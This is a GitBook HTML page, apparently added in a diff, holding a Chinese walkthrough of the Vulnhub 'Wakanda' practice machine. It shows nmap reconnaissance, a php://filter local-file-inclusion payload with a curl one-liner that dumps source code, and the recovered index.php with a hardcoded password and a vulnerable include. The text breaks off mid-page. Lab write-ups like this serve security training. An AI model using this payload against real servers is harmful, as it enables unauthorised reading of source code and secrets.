@@ -1,0 +1,1818 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>wakanda · Eki's CTF</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Eki">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    
+    <link rel="prev" href="five86-1.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    About
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../library/">
+            
+                <a href="../library/">
+            
+                    
+                    Library
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../library/steganography.html">
+            
+                <a href="../library/steganography.html">
+            
+                    
+                    Steganography
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../library/gdb-tutorial.html">
+            
+                <a href="../library/gdb-tutorial.html">
+            
+                    
+                    GDB Tutorial
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../library/sqli.html">
+            
+                <a href="../library/sqli.html">
+            
+                    
+                    SQL Inject
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../library/php/function.html">
+            
+                <a href="../library/php/function.html">
+            
+                    
+                    Functions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../library/php/protocol.html">
+            
+                <a href="../library/php/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../library/php/ace.html">
+            
+                <a href="../library/php/ace.html">
+            
+                    
+                    ACE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../library/php/serialize.html">
+            
+                <a href="../library/php/serialize.html">
+            
+                    
+                    Serialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../library/php/misc.html">
+            
+                <a href="../library/php/misc.html">
+            
+                    
+                    Misc
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../library/htaccess.html">
+            
+                <a href="../library/htaccess.html">
+            
+                    
+                    Apache .htaccess
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../library/ssti.html">
+            
+                <a href="../library/ssti.html">
+            
+                    
+                    SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../library/ssrf.html">
+            
+                <a href="../library/ssrf.html">
+            
+                    
+                    SSRF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../library/xxe.html">
+            
+                <a href="../library/xxe.html">
+            
+                    
+                    XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" data-path="../library/xss.html">
+            
+                <a href="../library/xss.html">
+            
+                    
+                    XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" data-path="../library/shell.html">
+            
+                <a href="../library/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" data-path="../library/crypto.html">
+            
+                <a href="../library/crypto.html">
+            
+                    
+                    Crypto
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.12" data-path="../library/js.html">
+            
+                <a href="../library/js.html">
+            
+                    
+                    JavaScript
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.13" data-path="../library/python.html">
+            
+                <a href="../library/python.html">
+            
+                    
+                    Python
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.14" data-path="../library/bash.html">
+            
+                <a href="../library/bash.html">
+            
+                    
+                    BASH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.15" data-path="../library/forensics.html">
+            
+                <a href="../library/forensics.html">
+            
+                    
+                    Forensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.16" data-path="../library/pentest.html">
+            
+                <a href="../library/pentest.html">
+            
+                    
+                    Pentest
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.17" data-path="../library/protocol.html">
+            
+                <a href="../library/protocol.html">
+            
+                    
+                    Protocol
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.18" data-path="../library/misc.html">
+            
+                <a href="../library/misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.19" data-path="../library/awd.html">
+            
+                <a href="../library/awd.html">
+            
+                    
+                    AWD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../contest/">
+            
+                <a href="../contest/">
+            
+                    
+                    Contest
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
+            
+                <a href="../contest/hfctf-2021.html">
+            
+                    
+                    2021数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
+            
+                <a href="../contest/hackergame-2019.html">
+            
+                    
+                    Hackergame 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
+            
+                <a href="../contest/tsctf-j2019.html">
+            
+                    
+                    TSCTF-J 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
+            
+                <a href="../contest/nctf2019.html">
+            
+                    
+                    NCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
+            
+                <a href="../contest/isoon-2019.html">
+            
+                    
+                    ISOON 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
+            
+                <a href="../contest/mrctf-2020.html">
+            
+                    
+                    MRCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
+            
+                <a href="../contest/hfctf-2020.html">
+            
+                    
+                    2020数字中国创新大赛虎符网络安全赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
+            
+                <a href="../contest/npuctf-2020.html">
+            
+                    
+                    NPUCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
+            
+                <a href="../contest/gkctf-2020.html">
+            
+                    
+                    GKCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
+            
+                <a href="../contest/sctf-2020.html">
+            
+                    
+                    SCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../adworld/">
+            
+                <a href="../adworld/">
+            
+                    
+                    ADworld
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../adworld/misc-exercise-area.html">
+            
+                <a href="../adworld/misc-exercise-area.html">
+            
+                    
+                    Misc Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../adworld/crypto-execrise-area.html">
+            
+                <a href="../adworld/crypto-execrise-area.html">
+            
+                    
+                    Crypto Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../adworld/web-execrise-area.html">
+            
+                <a href="../adworld/web-execrise-area.html">
+            
+                    
+                    Web Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../adworld/pwn-exercise-area.html">
+            
+                <a href="../adworld/pwn-exercise-area.html">
+            
+                    
+                    PWN Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../adworld/reverse-execrise-area.html">
+            
+                <a href="../adworld/reverse-execrise-area.html">
+            
+                    
+                    Reverse Exercise Area
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="../adworld/easy_tornado.html">
+            
+                <a href="../adworld/easy_tornado.html">
+            
+                    
+                    Easy Tornado
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="../adworld/i-got-id-200.html">
+            
+                <a href="../adworld/i-got-id-200.html">
+            
+                    
+                    i-got-id-200
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.8" data-path="../adworld/ics-02.html">
+            
+                <a href="../adworld/ics-02.html">
+            
+                    
+                    ics-02
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.9" data-path="../adworld/ics-07.html">
+            
+                <a href="../adworld/ics-07.html">
+            
+                    
+                    ics-07
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.10" data-path="../adworld/shrine.html">
+            
+                <a href="../adworld/shrine.html">
+            
+                    
+                    shrine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.11" data-path="../adworld/super_sqli.html">
+            
+                <a href="../adworld/super_sqli.html">
+            
+                    
+                    super_sqli
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.12" data-path="../adworld/web_php_unserialize.html">
+            
+                <a href="../adworld/web_php_unserialize.html">
+            
+                    
+                    Web_php_unserialize
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.13" data-path="../adworld/web_php_wrong_nginx_config.html">
+            
+                <a href="../adworld/web_php_wrong_nginx_config.html">
+            
+                    
+                    web_php_wrong_nginx_config
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.14" data-path="../adworld/web_python_template_injection.html">
+            
+                <a href="../adworld/web_python_template_injection.html">
+            
+                    
+                    Web_python_template_injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.15" data-path="../adworld/wtf.sh-150.html">
+            
+                <a href="../adworld/wtf.sh-150.html">
+            
+                    
+                    wtf.sh-150
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.16" data-path="../adworld/zhuanxv.html">
+            
+                <a href="../adworld/zhuanxv.html">
+            
+                    
+                    Zhuanxv
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../buuoj/">
+            
+                <a href="../buuoj/">
+            
+                    
+                    BUUOJ
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
+            
+                <a href="../buuoj/ciscn-northeast-2019.html">
+            
+                    
+                    CISCN 2019 华北赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
+            
+                <a href="../buuoj/ciscn-pre-2019.html">
+            
+                    
+                    CISCN 2019 初赛
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
+            
+                <a href="../buuoj/ciscn-final-2019.html">
+            
+                    
+                    CISCN 2019 Final
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
+            
+                <a href="../buuoj/wangdingcup-2018.html">
+            
+                    
+                    网鼎杯 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
+            
+                <a href="../buuoj/wangdingcup-2019.html">
+            
+                    
+                    网鼎杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
+            
+                <a href="../buuoj/roarctf-2019.html">
+            
+                    
+                    RoarCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
+            
+                <a href="../buuoj/0ctf-2016.html">
+            
+                    
+                    0CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
+            
+                <a href="../buuoj/gxyctf-2019.html">
+            
+                    
+                    GXYCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
+            
+                <a href="../buuoj/hitcon-2017.html">
+            
+                    
+                    Hitcon 2017
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
+            
+                <a href="../buuoj/jikedatiaozhan-2019.html">
+            
+                    
+                    极客大挑战2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
+            
+                <a href="../buuoj/lctf-2018.html">
+            
+                    
+                    LCTF 2018
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
+            
+                <a href="../buuoj/de1ctf-2019.html">
+            
+                    
+                    De1CTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
+            
+                <a href="../buuoj/swpu-2019.html">
+            
+                    
+                    SWPU 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
+            
+                <a href="../buuoj/suctf-2019.html">
+            
+                    
+                    SUCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
+            
+                <a href="../buuoj/bjdctf-2020.html">
+            
+                    
+                    BJDCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
+            
+                <a href="../buuoj/rctf-2015.html">
+            
+                    
+                    RCTF 2015
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
+            
+                <a href="../buuoj/bytectf-2019.html">
+            
+                    
+                    ByteCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
+            
+                <a href="../buuoj/qiangwangbei-2019.html">
+            
+                    
+                    强网杯 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
+            
+                <a href="../buuoj/ddctf-2019.html">
+            
+                    
+                    DDCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
+            
+                <a href="../buuoj/eis-2019.html">
+            
+                    
+                    EIS 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
+            
+                <a href="../buuoj/vn-2020.html">
+            
+                    
+                    V&N 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
+            
+                <a href="../buuoj/fbctf-2019.html">
+            
+                    
+                    FBCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GYCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
+            
+                <a href="../buuoj/bjd-2nd.html">
+            
+                    
+                    BJDCTF 2nd
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
+            
+                <a href="../buuoj/fireshellctf-2020.html">
+            
+                    
+                    FireShellCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
+            
+                <a href="../buuoj/gyctf-2020.html">
+            
+                    
+                    GWCTF 2020
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
+            
+                <a href="../buuoj/watevrctf-2019.html">
+            
+                    
+                    WatervrCTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
+            
+                <a href="../buuoj/ciscn-southeast-2019.html">
+            
+                    
+                    CISCN2019 华东南赛区
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
+            
+                <a href="../buuoj/bsidescf-2019.html">
+            
+                    
+                    BsidesCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
+            
+                <a href="../buuoj/rctf-2019.html">
+            
+                    
+                    RCTF 2019
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
+            
+                <a href="../pwnable.kr/">
+            
+                    
+                    pwnable.kr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
+            
+                <a href="../pwnable.kr/toddlers-bottle.html">
+            
+                    
+                    Toddler's Bottle
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
+            
+                <a href="../ethernaut/">
+            
+                    
+                    Ethernaut
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Vulnhub
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" data-path="dc-9.html">
+            
+                <a href="dc-9.html">
+            
+                    
+                    DC-9
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" data-path="five86-1.html">
+            
+                <a href="five86-1.html">
+            
+                    
+                    five86-1
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.8.3" data-path="wakanda.html">
+            
+                <a href="wakanda.html">
+            
+                    
+                    wakanda
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >wakanda</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#wakanda-&#x9776;&#x673A;&#x5B9E;&#x8DF5;"><b></b>Wakanda &#x9776;&#x673A;&#x5B9E;&#x8DF5;</a></li><ul><li><span class="title-icon "></span><a href="#0x01-&#x6E17;&#x900F;&#x8FC7;&#x7A0B;"><b></b>0x01 &#x6E17;&#x900F;&#x8FC7;&#x7A0B;</a></li></ul></ul></div><a href="#wakanda-&#x9776;&#x673A;&#x5B9E;&#x8DF5;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="wakanda-&#x9776;&#x673A;&#x5B9E;&#x8DF5;"><a name="wakanda-&#x9776;&#x673A;&#x5B9E;&#x8DF5;" class="anchor-navigation-ex-anchor" href="#wakanda-&#x9776;&#x673A;&#x5B9E;&#x8DF5;"><i class="fa fa-link" aria-hidden="true"></i></a>Wakanda &#x9776;&#x673A;&#x5B9E;&#x8DF5;</h1>
+<h2 id="0x01-&#x6E17;&#x900F;&#x8FC7;&#x7A0B;"><a name="0x01-&#x6E17;&#x900F;&#x8FC7;&#x7A0B;" class="anchor-navigation-ex-anchor" href="#0x01-&#x6E17;&#x900F;&#x8FC7;&#x7A0B;"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 &#x6E17;&#x900F;&#x8FC7;&#x7A0B;</h2>
+<p><code>arp-scan-l</code>&#x5F97;&#x5230;&#x9776;&#x673A;&#x5730;&#x5740;192.168.31.154</p>
+<p>&#x4FE1;&#x606F;&#x641C;&#x96C6;</p>
+<pre><code>nmap -A -p- 192.168.31.154
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-23 15:18 CST
+Nmap scan report for 192.168.31.154
+Host is up (0.00041s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Vibranium Market
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          40963/tcp   status
+|   100024  1          41052/udp   status
+|   100024  1          52522/tcp6  status
+|_  100024  1          57819/udp6  status
+3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
+|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
+|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
+|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
+40963/tcp open  status  1 (RPC #100024)
+MAC Address: 08:00:27:78:4B:17 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>&#x8BBF;&#x95EE;&#x4E00;&#x4E0B;web&#x670D;&#x52A1;</p>
+<p>&#x770B;&#x4E00;&#x4E0B;&#x6E90;&#x4EE3;&#x7801;</p>
+<p>&#x53D1;&#x73B0;&#x6709;&#x4E2A;lang&#x53C2;&#x6570;</p>
+<p>&#x5B58;&#x5728;LFI&#x6F0F;&#x6D1E;</p>
+<pre><code>payload=/?lang=php://filter/convert.base64-encode/resource=index
+</code></pre><p>&#x5148;&#x8BFB;&#x4E00;&#x4E0B;&#x5DF2;&#x77E5;&#x6587;&#x4EF6;&#x7684;&#x6E90;&#x7801;</p>
+<blockquote>
+<p>Tips:</p>
+<p>&#x8BFB;&#x53D6;&#x5BF9;&#x5E94;&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x884C;&#x7B80;&#x5316;&#x64CD;&#x4F5C;</p>
+<pre><code>curl http://192.168.xxx.xxx/?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d &gt; index.php
+</code></pre></blockquote>
+<pre><code class="lang-php+HTML">//index.php
+&lt;?php
+$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it
+
+if (isset($_GET[&apos;lang&apos;]))
+{
+include($_GET[&apos;lang&apos;].&quot;.php&quot;);
+}
+
+?&gt;
+
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;
+    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;
+
+    &lt;title&gt;Vibranium Market&lt;/title&gt;
+
+
+    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+
+    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;
+  &lt;/head&gt;
+
+  &lt;body class=&quot;text-center&quot;&gt;
+
+    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;
+      &lt;header class=&quot;masthead mb-auto&quot;&gt;
+        &lt;div class=&quot;inner&quot;&gt;
+          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;
